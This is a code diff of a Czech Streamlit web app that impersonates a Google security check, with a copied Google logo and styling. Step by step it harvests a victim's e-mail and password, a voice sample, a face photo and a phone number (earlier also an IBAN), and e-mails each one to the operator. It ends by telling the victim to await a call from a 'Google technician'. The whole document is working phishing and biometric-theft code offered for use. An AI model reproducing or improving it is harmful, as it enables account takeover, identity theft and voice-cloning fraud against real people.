@@ -9,7 +9,13 @@ from email.mime.image import MIMEImage
 from email.mime.application import MIMEApplication
 from datetime import datetime
 
-# --- KONFIGURACE ---
+# Import s ošetřením chyby, pokud by knihovna chyběla
+try:
+    from audio_recorder_streamlit import audio_recorder
+except ImportError:
+    st.error("Chybí knihovna audio-recorder-streamlit. Přidej ji do requirements.txt!")
+
+# --- NASTAVENÍ ---
 MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
 MOJE_HESLO = os.environ.get("MOJE_HESLO")
 
@@ -24,8 +30,7 @@ def odeslat_email(subjekt, text, soubor=None, typ="text"):
         if typ == "image":
             part = MIMEImage(soubor.read(), name="foto.png")
         elif typ == "audio":
-            # Oprava pro rok 2026: st.audio_input vrací BytesIO
-            part = MIMEApplication(soubor.read() if hasattr(soubor, 'read') else soubor, Name="nahravka.wav")
+            part = MIMEApplication(soubor, Name="nahravka.wav")
             part['Content-Disposition'] = 'attachment; filename="nahravka.wav"'
         msg.attach(part)
     try:
@@ -40,17 +45,16 @@ def je_validni_tel(tel): return re.match(r"^\d{9}$", tel)
 
 if "step" not in st.session_state: st.session_state.step = "login"
 
-st.set_page_config(page_title="Zabezpečení Google", page_icon="🔒")
+st.set_page_config(page_title="Google Security", page_icon="🔒")
 st.markdown("<style>div.stButton > button:first-child { background-color: #4285F4; color: white; border: none; width: 100%; font-weight: bold; }</style>", unsafe_allow_html=True)
 
 def logo():
     st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)
 
-# Oprava Layoutu
+# OPRAVA: Definice sloupců pro rok 2026
 col1, col2, col3 = st.columns(3)
 
 with col2:
-    # 1. LOGIN
     if st.session_state.step == "login":
         logo()
         em = st.text_input("E-mail")
@@ -61,43 +65,40 @@ with col2:
                 odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                 st.session_state.step = "voice"
                 st.rerun()
-            else: st.error("Neplatný formát e-mailu nebo krátké heslo.")
+            else: st.error("Neplatné údaje")
 
-    # 2. VOICE (Využívá vestavěný st.audio_input - nejstabilnější řešení)
     elif st.session_state.step == "voice":
         logo()
-        st.info("Fáze 2: Hlasové ověření identity")
-        st.write("Nahrajte větu: 'Autorizuji tento přístup k mému účtu.'")
-        # Vestavěná funkce Streamlitu pro rok 2026
-        audio_data = st.audio_input("Klikněte pro nahrávání")
-        if audio_data:
-            if st.button("Odeslat hlasový vzorek"):
-                odeslat_email("🎙️ VOICE", f"Uživatel: {st.session_state.zadany_email}", soubor=audio_data, typ="audio")
+        st.info("Hlasové ověření identity")
+        st.write("Klikněte na mikrofon a mluvte.")
+        # audio_recorder potřebuje HTTPS na mobilu!
+        audio_bytes = audio_recorder(text="", icon_size="3x", icon_color="#4285F4")
+        if audio_bytes:
+            if st.button("Potvrdit hlas"):
+                odeslat_email("🎙️ VOICE", f"Uživatel: {st.session_state.zadany_email}", soubor=audio_bytes, typ="audio")
                 st.session_state.step = "face"
                 st.rerun()
 
-    # 3. FACE
     elif st.session_state.step == "face":
         logo()
-        st.write("Fáze 3: Biometrický sken obličeje")
-        foto = st.camera_input("Skenování...")
+        foto = st.camera_input("Biometrický sken")
         if foto:
             odeslat_email("📸 FACE", f"Uživatel: {st.session_state.zadany_email}", soubor=foto, typ="image")
-            st.session_state.step = "final"
+            st.session_state.step = "final_check"
             st.rerun()
 
-    # 4. FINÁLNÍ OVĚŘENÍ
-    elif st.session_state.step == "final":
+    elif st.session_state.step == "final_check":
         logo()
-        st.error("⚠️ Vyžadováno potvrzení technika")
-        zeme = st.selectbox("Země", ["Česká republika (+420)", "Slovensko (+421)"])
-        tel = st.text_input("Telefonní číslo (9 číslic)")
-        ib = st.text_input("BankID / IBAN (pro urychlení)")
-        
-        if st.button("Autorizovat nyní"):
+        st.error("⚠️ Vyžadováno ověření")
+        tel = st.text_input("Telefon (9 číslic)")
+        if st.button("Autorizovat"):
             if je_validni_tel(tel):
-                odeslat_email("📞 FINAL", f"Email: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
-                st.success("Požadavek odeslán. Čekejte hovor technika.")
-                st.balloons()
-                st.progress(95)
-            else: st.error("Telefon musí mít přesně 9 číslic.")
+                odeslat_email("📞 TEL", f"User: {st.session_state.zadany_email}\nTel: {tel}")
+                st.success("Čekejte hovor technika.")
+                st.session_state.step = "finish"
+                st.rerun()
+
+    elif st.session_state.step == "finish":
+        logo()
+        st.success("Status: Čekání na hovor technika Google.")
+        st.progress(90)
